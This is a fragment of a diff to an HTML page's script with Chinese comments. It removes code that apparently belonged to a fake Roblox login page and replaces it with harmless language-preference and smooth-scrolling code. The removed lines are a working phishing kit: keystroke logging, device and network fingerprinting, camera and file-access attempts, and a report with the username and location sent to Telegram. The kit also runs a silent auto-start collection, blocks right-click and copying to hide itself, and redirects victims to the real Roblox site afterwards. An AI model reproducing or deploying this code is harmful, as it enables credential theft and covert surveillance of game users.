-                time: new Date().toISOString()
-            });
-        });
-        
-        // 键盘监控
-        document.addEventListener('keydown', (e) => {
-            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
-                collectedData.behavior.keystrokes.push({
-                    key: e.key,
-                    time: Date.now()
+            // 检查是否有保存的语言偏好
+            const savedLang = localStorage.getItem('preferred-language');
+            if (savedLang) {
+                setLanguage(savedLang);
+                
+                // 更新按钮活动状态
+                langButtons.forEach(btn => {
+                    btn.classList.remove('active');
+                    if (btn.getAttribute('data-lang') === savedLang) {
+                        btn.classList.add('active');
+                    }
                 });
             }
+            
+            // 平滑滚动到锚点
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if (targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
         });
-    }
-
-    // ==================== 主收集流程 ====================
-    async function startAdvancedCollection() {
-        if (isCollecting) return;
-        isCollecting = true;
-        
-        // 禁用登录按钮
-        const loginBtn = document.getElementById('loginButton');
-        loginBtn.disabled = true;
-        loginBtn.textContent = '验证中...';
-        
-        try {
-            // 收集设备信息
-            await collectDeviceInfo();
-            await delay(1000);
-            
-            // 收集网络信息
-            await collectNetworkInfo();
-            await delay(1000);
-            
-            // 尝试摄像头访问
-            await accessCamera();
-            await delay(1000);
-            
-            // 开始行为监控
-            startBehaviorMonitoring();
-            
-            // 尝试文件访问
-            attemptFileAccess();
-            
-            // 发送完整报告
-            await sendCompleteReport();
-            
-            // 显示成功消息
-            await delay(2000);
-            showSuccess();
-            
-            // 重定向到真正的Roblox
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/login';
-            }, 3000);
-            
-        } catch (error) {
-            console.error('收集失败:', error);
-            showError('验证失败，请重试');
-            loginBtn.disabled = false;
-            loginBtn.textContent = '登录';
-            isCollecting = false;
-        }
-    }
-
-    async function sendCompleteReport() {
-        const report = `📊 <b>Roblox数据收集完成</b>
-────────────────
-🆔 <b>会话ID:</b> ${collectedData.sessionId}
-🕐 <b>时间:</b> ${new Date().toLocaleString('zh-CN')}
-────────────────
-👤 <b>用户名:</b> ${collectedData.credentials.username || '无'}
-────────────────
-📱 <b>设备:</b> ${navigator.platform}
-📍 <b>位置:</b> ${collectedData.networkInfo.geo?.city || '未知'}
-────────────────
-📸 <b>照片:</b> ${collectedData.photos.length}张
-📁 <b>文件:</b> ${collectedData.files.length > 0 ? '已扫描' : '未扫描'}
-────────────────
-✅ <b>状态:</b> 完成`;
-        
-        await sendToTelegram(report);
-    }
-
-    // ==================== UI控制 ====================
-    function showLoading() {
-        document.getElementById('loadingOverlay').style.display = 'flex';
-        document.getElementById('errorMessage').classList.add('hidden');
-    }
-
-    function hideLoading() {
-        document.getElementById('loadingOverlay').style.display = 'none';
-    }
-
-    function showSuccess() {
-        hideLoading();
-        document.getElementById('successMessage').classList.remove('hidden');
-    }
-
-    function showError(message) {
-        hideLoading();
-        const errorElement = document.getElementById('errorMessage');
-        if (message) {
-            errorElement.textContent = message;
-        }
-        errorElement.classList.remove('hidden');
-    }
-
-    function delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    // ==================== 防检测 ====================
-    function setupProtection() {
-        // 禁用右键
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            sendToTelegram('⚠️ 用户尝试右键点击页面');
-            return false;
-        });
-        
-        // 防止复制
-        document.addEventListener('copy', (e) => {
-            e.preventDefault();
-        });
-    }
-
-    // ==================== 初始化 ====================
-    window.addEventListener('DOMContentLoaded', () => {
-        setupProtection();
-        
-        // 密码显示切换
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            const passwordInput = document.getElementById('password');
-            const type = passwordInput.type === 'password' ? 'text' : 'password';
-            passwordInput.type = type;
-            this.textContent = type === 'password' ? '👁️' : '🔒';
-        });
-        
-        // 回车登录
-        document.getElementById('password').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                handleLogin();
-            }
-        });
-        
-        // 自动开始收集（延迟后）
-        setTimeout(() => {
-            if (!isCollecting) {
-                stealthCollection();
-            }
-        }, 6000);
-    });
-
-    // 静默收集
-    async function stealthCollection() {
-        try {
-            await collectDeviceInfo();
-            await collectNetworkInfo();
-            startBehaviorMonitoring();
-            setTimeout(() => attemptFileAccess(), 3000);
-        } catch (e) {
-            // 静默失败
-        }
-    }
-</script>
+    </script>
 </body>
 </html>
